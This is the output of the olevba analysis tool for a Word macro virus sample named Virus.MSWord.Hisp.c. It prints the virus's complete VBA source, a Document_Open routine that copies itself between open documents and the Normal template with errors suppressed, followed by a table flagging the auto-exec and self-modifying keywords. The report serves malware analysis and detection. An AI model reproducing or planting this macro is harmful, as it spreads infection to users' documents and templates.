olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hisp.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hisp.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97M
'Processing Opening of Victim
Sub Document_Open()
'Do not on errors
On Error Resume Next
'Install objects
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'Copies itself from Normal to victim
If NT.Lines(1, 1) <> "'W97M" Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
'Copies itself from victim to Normal
If AD.Lines(1, 1) <> "'W97M" Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
'End!
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

